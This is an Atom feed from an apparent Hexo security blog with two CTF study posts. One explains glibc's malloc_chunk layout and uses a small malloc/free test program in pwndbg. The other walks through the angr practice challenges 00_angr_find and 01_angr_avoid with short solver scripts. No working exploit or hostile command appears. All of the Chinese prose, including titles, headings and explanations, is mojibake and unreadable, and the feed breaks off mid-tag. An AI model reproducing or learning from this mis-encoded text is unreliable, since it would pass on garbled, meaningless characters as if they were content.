<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fish</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-02-12T12:23:02.319Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Fish</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwn heap[malloc_chunkç»“æ„ä½“]</title>
    <link href="http://example.com/2021/02/12/CTF/pwn/heap/malloc_chunk%E7%BB%93%E6%9E%84/"/>
    <id>http://example.com/2021/02/12/CTF/pwn/heap/malloc_chunk%E7%BB%93%E6%9E%84/</id>
    <published>2021-02-12T12:23:35.634Z</published>
    <updated>2021-02-12T12:23:02.319Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>æ–‡ç« å‚è€ƒäº†äº†ç½‘ä¸Šçš„ä¸€äº›å¸ˆå‚…æ–‡ç« å†…å®¹ï¼Œæ€»ç»“äº†ä¸€äº›è‡ªå·±çš„ç†è§£ã€‚</p><h2 id="malloc-chunkç»“æ„ä½“æˆå‘˜è§£æ"><a href="#malloc-chunkç»“æ„ä½“æˆå‘˜è§£æ" class="headerlink" title="malloc_chunkç»“æ„ä½“æˆå‘˜è§£æ"></a>malloc_chunkç»“æ„ä½“æˆå‘˜è§£æ</h2><p><code>malloc_chunk</code>ç»“æ„å®šä¹‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å„ä¸ªæˆå‘˜çš„ä½œç”¨"><a href="#å„ä¸ªæˆå‘˜çš„ä½œç”¨" class="headerlink" title="å„ä¸ªæˆå‘˜çš„ä½œç”¨"></a>å„ä¸ªæˆå‘˜çš„ä½œç”¨</h3><ol><li><p><code>prev_size</code></p><ul><li>å¦‚æœè¯¥<code>chunk</code>ç‰©ç†åœ°å€ç›¸é‚»çš„å‰ä¸€<code>chunk</code>(ä¸¤ä¸ªæŒ‡é’ˆçš„å·®å€¼ä¸ºå‰ä¸€ä¸ªchunkå¤§å°)æ˜¯ç©ºé—²çš„<code>chunk</code>ï¼Œè¿™ä¸ªå­—æ®µè®°å½•çš„æ˜¯å‰ä¸€ä¸ªå­—ç¬¦æ®µçš„å¤§å°</li><li>ç”¨äºå‚¨å­˜ç‰©ç†åœ°å€ç›¸é‚»çš„<code>chunk</code>(ä½åœ°å€chunk)çš„ä¿¡æ¯</li><li>è¢«å…±äº«ï¼Œå¦‚æœå½“å‰<code>chunk</code>å¤§ä¸å¤Ÿç”¨ï¼Œå¯ä»¥å ç”¨ä¸‹ä¸€ä¸ª<code>chunk</code>çš„<code>prev_size</code>å­—æ®µ</li></ul></li><li><p><code>size</code></p><ul><li><p>å­˜å‚¨å½“å‰<code>chunk</code>çš„å¤§å°ï¼Œchunkçš„å¤§å°å†…å­˜ç”³è¯·ï¼Œä¸<code>SIZE_SZ</code>æœ‰å…³ï¼Œå¦‚æœä¸æ˜¯<code>2*SIZE_SZ</code>çš„æ•´æ•°å€ï¼Œä¼šè‡ªåŠ¨å‘ä¸Šå–æ•´åˆ°<code>2*SIZE_SZ</code>çš„æ•´æ•°å€ï¼Œ32ä½æ“ä½œç³»ç»Ÿä¸­<code>SIZE_SZ</code>æ˜¯32ä½4ä¸ªå­—èŠ‚ï¼Œ64ä½æ“ä½œç³»ç»Ÿä¸­<code>SIZE_SZ</code>æ˜¯64ä½8ä¸ªå­—èŠ‚ã€‚32ä½å¿…é¡»8å­—èŠ‚å¯¹é½ï¼Œ64ä½å¿…é¡»16å­—èŠ‚å¯¹é½ï¼Œæ— è®º32ä½è¿˜æ˜¯64ä½ï¼Œ<code>size</code>æœ€åä¸‰ä½éƒ½æ²¡æœ‰ç”¨ï¼Œæ‰€ç”¨å¯ä»¥ç”¨æ¥å­˜å‚¨å…¶ä»–ä¿¡æ¯</p><ul><li><p><strong>NON_MAIN_ARENA</strong></p></li><li><p><strong>IS_MAPPED</strong></p><p>è®°å½•å½“å‰chunkæ˜¯å¦æ˜¯ç”±<code>mmap</code>ç”³è¯·</p></li><li><p><strong>PREV_INUSE</strong></p><p>è®°å½•å‰ä¸€ä¸ª chunk å—æ˜¯å¦è¢«åˆ†é…ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ª chunk çš„ size çš„ P ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² chunk ä¹‹é—´çš„åˆå¹¶ã€‚</p></li></ul></li></ul></li><li><p><code>fd</code>å’Œ<code>bk</code></p><ul><li>chunkå¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œfdåœ°å€æ®µå­˜æ”¾çš„æ˜¯ç”¨æˆ·æ•°æ®ã€‚chunkåœ¨ç©ºé—²çš„æ—¶å€™é€šè¿‡é“¾è¡¨ç®¡ç†</li><li><code>fd</code>æŒ‡å‘ä¸Šä¸€ä¸ªç©ºé—²ï¼ˆéç‰©ç†ç©ºé—²ï¼‰çš„chunk</li><li><code>bk</code>æŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²ï¼ˆéç‰©ç†ç©ºé—²ï¼‰çš„chunk</li></ul></li><li><p><code>fd_nextsize</code>å’Œ<code>bk_nextsize</code></p><ul><li></li></ul></li></ol><ul><li><p>chunkè¢«ä½¿ç”¨æ—¶å†…å­˜ç»“æ„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, <span class="keyword">in</span> bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, <span class="keyword">in</span> bytes                |A|<span class="number">0</span>|<span class="number">1</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></li><li><p>chunkè¢«é‡Šæ”¾æ—¶å†…å­˜ç»“æ„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, <span class="keyword">if</span> unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:<span class="string">&#x27; |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="line"><span class="string">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="string">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="string">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">        |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="string">        .                                                               .</span></span><br><span class="line"><span class="string"> next   .                                                               |</span></span><br><span class="line"><span class="string">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="string">`foot:&#x27;</span> |             Size of chunk, <span class="keyword">in</span> bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, <span class="keyword">in</span> bytes                |A|<span class="number">0</span>|<span class="number">0</span>|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></li></ul><h3 id="å†…å­˜å¯¹é½"><a href="#å†…å­˜å¯¹é½" class="headerlink" title="å†…å­˜å¯¹é½"></a>å†…å­˜å¯¹é½</h3><p>mallocå‡½æ•°ç”³è¯·çš„chunkåœ°å€éƒ½æ˜¯8å­—èŠ‚æˆ–è€…16å­—èŠ‚å¯¹é½ï¼ˆ32ä½8å­—èŠ‚ï¼Œ64ä½16å­—èŠ‚ï¼‰ï¼Œæ‰€è°“å­—èŠ‚å¯¹é½ï¼Œå°±æ˜¯æ‰€æœ‰çš„åœ°å€æœ€å8ä½æˆ–16ä½éƒ½æ˜¯ä¸€æ ·çš„ï¼ˆå¤§å¤šæ•°æ—¶å€™ä¸º8çš„æ•´æ•°å€ï¼‰ï¼Œå¸¸è§çš„å†…å­˜å¯¹é½æœ‰8å­—èŠ‚å¯¹é½å’Œ16å­—èŠ‚å¯¹é½</p><ul><li><p>8å­—èŠ‚å¯¹é½</p><p>åœ°å€çš„æœ€å8ä½ï¼ˆ2è¿›åˆ¶ä½ï¼‰10è¿›åˆ¶è¡¨ç¤ºä¸º8</p></li><li><p>16å­—èŠ‚å¯¹é½</p><p>åœ°å€çš„æœ€å8ä½ï¼ˆ2è¿›åˆ¶ä½ï¼‰10è¿›åˆ¶è¡¨ç¤ºä¸º0</p></li></ul><p>ä¸‹é¢ç”¨pwndbgå±•ç¤º32ä½ä¸‹chunkå†…å­˜ç»“æ„</p><h3 id="pwndbgåˆ†æchunkåœ¨å†…å­˜ä¸­çš„ç»“æ„"><a href="#pwndbgåˆ†æchunkåœ¨å†…å­˜ä¸­çš„ç»“æ„" class="headerlink" title="pwndbgåˆ†æchunkåœ¨å†…å­˜ä¸­çš„ç»“æ„"></a>pwndbgåˆ†æchunkåœ¨å†…å­˜ä¸­çš„ç»“æ„</h3><p>æµ‹è¯•æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ptr1 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr2 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr3 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr4 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr5 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="keyword">int</span>* ptr6 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr1-&gt;%p\n&quot;</span>, ptr1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr2-&gt;%p\n&quot;</span>, ptr2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr3-&gt;%p\n&quot;</span>, ptr3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr4-&gt;%p\n&quot;</span>, ptr4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr5-&gt;%p\n&quot;</span>, ptr5);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptr6-&gt;%p\n&quot;</span>, ptr6);</span><br><span class="line">        <span class="built_in">free</span>(ptr1);</span><br><span class="line">        <span class="built_in">free</span>(ptr2);</span><br><span class="line">        <span class="built_in">free</span>(ptr3);</span><br><span class="line">        <span class="built_in">free</span>(ptr4);</span><br><span class="line">        <span class="built_in">free</span>(ptr5);</span><br><span class="line">        <span class="built_in">free</span>(ptr6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>32ä½ç¨‹åº</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212183615924.png" alt="32ä½ç¨‹åºmallocç”³è¯·åœ°å€"></p></li><li><p>64ä½ç¨‹åº</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212183727096.png" alt="64ä½ç¨‹åºmallocç”³è¯·åœ°å€"></p></li><li><p>heapå‘½ä»¤æŸ¥çœ‹æ‰€æœ‰å †ä¿¡æ¯</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212184244904.png"></p></li><li><p>åˆ†æäºŒè¿›åˆ¶æ•°æ®</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210212195957160.png"></p><p>64ä½ç¨‹åºchunkç»“æ„ä¸ä¹‹ç±»ä¼¼</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;æ–‡ç« å‚è€ƒäº†äº†ç½‘ä¸Šçš„ä¸€äº›å¸ˆå‚…æ–‡ç« å†…å®¹ï¼Œæ€»ç»“äº†ä¸€äº›è‡ªå·±çš„ç†è§£ã€‚&lt;/p&gt;
&lt;h2 id=&quot;malloc-chunkç»“æ„ä½“æˆå‘˜è§£æ&quot;&gt;&lt;a href=&quot;#malloc-chunkç»“æ„ä½“æˆå‘˜è§£æ&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://example.com/tags/heap/"/>
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ctf_angrğŸ¦„[angr_0]</title>
    <link href="http://example.com/2021/02/11/CTF/angr/ctf_angr_0/"/>
    <id>http://example.com/2021/02/11/CTF/angr/ctf_angr_0/</id>
    <published>2021-02-11T14:41:47.559Z</published>
    <updated>2021-02-11T14:51:50.433Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="ctf-angr"><a href="#ctf-angr" class="headerlink" title="ctf_angr"></a>ctf_angr</h2><p>ä¸€ä¸ªç”¨äºç»ƒä¹ angrçš„ctfé¢˜åº“ï¼Œä»å…¥é—¨åˆ°è¿›é˜¶ï¼ŒåŒæ—¶é…å¥—å…¨è‹±æ–‡pptï¼Œä»ç¬¦å·æ‰§è¡Œåˆ°angrè¯¦ç»†ä½¿ç”¨æ–¹å¼ï¼Œä¸€ç«™å¼å…¥é—¨ğŸ‘</p><p>GitHubä¸‹è½½åœ°å€[<a href="https://github.com/ZERO-A-ONE/AngrCTF_FITM">é“¾æ¥</a>]</p><h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>ä¼ªä»£ç éå¸¸ç®€å•,æ‰§è¡Œæµç¨‹ä¸ºï¼šè¾“å…¥-&gt;åŠ å¯†-&gt;æ¯”è¾ƒ-&gt;è¾“å‡ºï¼Œåˆ†æ”¯å°‘ï¼Œæ‰€ä»¥éå†èµ·æ¥é€Ÿåº¦å¾ˆå¿«</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211150156381.png"></p><p>ä¼ªä»£ç æ˜“è¯»ï¼Œæ•°æ®çš„å­—ç¬¦ä¸²ç»è¿‡complex_functionå‡½æ•°åŠ å¯†è¿‡åæ¯”è¾ƒã€‚</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211150039313.png" alt="main_function"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211150407696.png" alt="complex_function"></p><p>å¦‚æœæŒ‰ç…§ä¼ ç»Ÿçš„æ–¹æ³•ï¼Œéœ€è¦é€†åŠ å¯†ç®—æ³•ç„¶åå†™å‡ºè§£å¯†ç®—æ³•ï¼Œä½†æ˜¯angrä¸éœ€è¦è¿™äº›ç¹ççš„æ“ä½œï¼Œåªéœ€è¦å‘Šè¯‰å…¶å®åœ°å€å’Œç›®æ ‡åœ°å€ï¼Œangrå°±ä¼šè¿›è¡Œæ‰€æœ‰éå†ï¼Œå¯¹ç¬¦å·è¿›è¡Œçº¦æŸï¼Œä»è€Œå¾—å‡ºç»“æœã€‚</p><h3 id="angréå†æ±‚è§£"><a href="#angréå†æ±‚è§£" class="headerlink" title="angréå†æ±‚è§£"></a>angréå†æ±‚è§£</h3><p>é¦–å…ˆè´´å‡ºå…¨ä»£ç ä»¥åŠè¿è¡Œç»“æœï¼Œæœ€åæ‰“å°çš„å€¼å°±æ˜¯å¯¹ç¬¦å·ä¸æ–­çº¦æŸæ±‚è§£å¾—åˆ°çš„ç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">filepath = <span class="string">&#x27;/home/fish/æ¡Œé¢/00_angr_find&#x27;</span></span><br><span class="line"></span><br><span class="line">project = angr.Project(filepath)</span><br><span class="line">initial_state = project.factory.entry_state()</span><br><span class="line">print_good_addr = <span class="number">0x0804867D</span></span><br><span class="line">simulation = project.factory.simgr(initial_state)</span><br><span class="line">simulation.explore(find = print_good_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    print(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211150835527.png"></p><p>ä½¿ç”¨angrè¿‡ç¨‹</p><ol><li><p>åˆ›å»ºé¡¹ç›®</p><p>é¦–å…ˆç”¨Projectå‡½æ•°åˆ›å»ºä¸€ä¸ªé¡¹ç›®ï¼ŒProjectå‚æ•°ä¸ºéœ€è¦æ±‚è§£çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">project = angr.Project(filepath)</span><br></pre></td></tr></table></figure></li><li><p>å‘Šè¯‰angrä»å“ªå„¿å¼€å§‹æ‰§è¡Œ</p><p>entry_state()è¡¨æ˜ä»mainå‡½æ•°å¼€å§‹æ‰§è¡Œï¼ˆä»å¤´å¼€å§‹æ‰§è¡Œï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">initial_state = project.factory.entry_state()</span><br></pre></td></tr></table></figure></li><li><p>åˆ›å»ºæ¨¡æ‹Ÿç®¡ç†å™¨</p><p>simgræ˜¯åˆ›å»ºå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simulation = project.factory.simgr(initial_state)</span><br></pre></td></tr></table></figure></li><li><p>å¼€å§‹æ¢ç´¢äºŒè¿›åˆ¶æ–‡ä»¶</p><p>exploreå‡½æ•°éœ€è¦éå†çš„ç»“æŸåœ°å€ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªäºŒè¿›åˆ¶ç¨‹åºä¸­æ‰“å°å­—ç¬¦ä¸²**Good Job.**çš„åœ°å€ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_good_address = <span class="number">0x0804867D</span></span><br><span class="line">simulation.explore(find=print_good_address)</span><br></pre></td></tr></table></figure></li><li><p>æ£€æŸ¥æ˜¯å¦æ‰¾åˆ°äº†è§£å†³æ–¹æ¡ˆ</p><p>å¦‚æœæ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œfoundä¸ä¸ºç©ºï¼ˆåœ¨pyhonä¸­ç©ºä»£è¡¨falseï¼Œä¸ä¸ºç©ºä»£è¡¨trueï¼‰,å°†è§£å†³æ–¹æ¡ˆæ‰“å°åˆ°å±å¹•è¾“å‡ºç«¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">   solution_state = simulation.found[<span class="number">0</span>]</span><br></pre></td></tr></table></figure></li></ol><h3 id="æ€»ç»“ä¸»è¦è¿‡ç¨‹"><a href="#æ€»ç»“ä¸»è¦è¿‡ç¨‹" class="headerlink" title="æ€»ç»“ä¸»è¦è¿‡ç¨‹"></a>æ€»ç»“ä¸»è¦è¿‡ç¨‹</h3><p>åˆ›å»ºå·¥ç¨‹ â€“&gt; æŒ‡å®šæ‰§è¡Œå…¥å£ â€“&gt; åˆ›å»ºäºŒè¿›åˆ¶æ–‡ä»¶æ‰§è¡Œæ¨¡æ‹Ÿå™¨ â€“&gt; æ¢ç´¢å„ä¸ªåˆ†æ”¯ â€“&gt; è§£å‡ºè§£å†³æ–¹æ¡ˆ â€“&gt; æ‰“å°ç»“æœ</p><h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p>â€‹        è¿™ä¸€æ¬¡çš„æ–‡ä»¶è¾ƒå¤§ï¼Œmainå‡½æ•°åœ¨idaä¸­ä¸èƒ½F5ï¼Œå³ä¾¿F5è¿‡åä¹Ÿå¯èƒ½å› ä¸ºä¼ªä»£ç è¾ƒå¤æ‚æ— æ³•é˜…è¯»ï¼Œæ‰€ä»¥åœ¨ç®€å•è§‚å¯Ÿè¿‡åå¯ä»¥ç›´æ¥ç”¨angrçœ‹æ˜¯å¦æœ‰è§£ï¼Œä½†æ˜¯ä½œè€…è¿™æ¬¡åœ¨ç¨‹åºä¸­åŠ äº†ä¸€ç‚¹æ–™ï¼Œæ–¹ä¾¿æˆ‘ä»¬å­¦ä¹ avoidå‚æ•°</p><p>should_succeedè¿™ä¸ªå˜é‡åˆå§‹å€¼ä¸º1æœ¬èº«å¹¶æ²¡æœ‰é—®é¢˜ä½†æ˜¯avoid_meå‡½æ•°ä¼šå°†should_succeedèµ‹å€¼ä¸º0ã€‚</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211161539597.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211161257626.png"></p><p>â€‹        æ‰€ä»¥è¿™ä¸ªå¦‚æœè¦æ‰“å°å‡º**Good Job.**éœ€è¦ä¸¤ä¸ªæ¡ä»¶åŒæ—¶æ»¡è¶³ï¼ˆshould_succeedå€¼ä¸º1ï¼Œä¸”è¾“å…¥çš„å­—ç¬¦ä¸²åŠ å¯†è¿‡åæ»¡è¶³æ¡ä»¶ï¼‰ï¼Œå¦‚æœåœ¨éå†æ—¶ä¸æ·»åŠ avoidæ¡ä»¶ä¼šèŠ±è´¹å¤§é‡çš„æ—¶é—´ï¼ˆè™½ç„¶ç»“æœä¸€æ ·ï¼‰ï¼Œä¸ºäº†å°½å¯èƒ½çš„èŠ‚çº¦æ—¶é—´ï¼Œéœ€è¦åœ¨éå†æ—¶é¿å…avoid_meå‡½æ•°ï¼Œæ‰€ä»¥åœ¨ä¸Šä¸€ä¸ªçš„æ¡ä»¶ä¸‹ï¼Œéœ€è¦åœ¨æ·»åŠ å…¶ä»–æ¡ä»¶ï¼Œè¿™é‡Œéœ€è¦æ·»åŠ avoid</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">avoid_addr = <span class="number">0x080485A8</span> <span class="comment"># avoid_meå‡½æ•°åœ°å€</span></span><br><span class="line">simgr.explore(find = good_addr, avoid = avoid_addr) <span class="comment"># æ·»åŠ avoidæ¡ä»¶</span></span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210211162409904.png"></p><h2 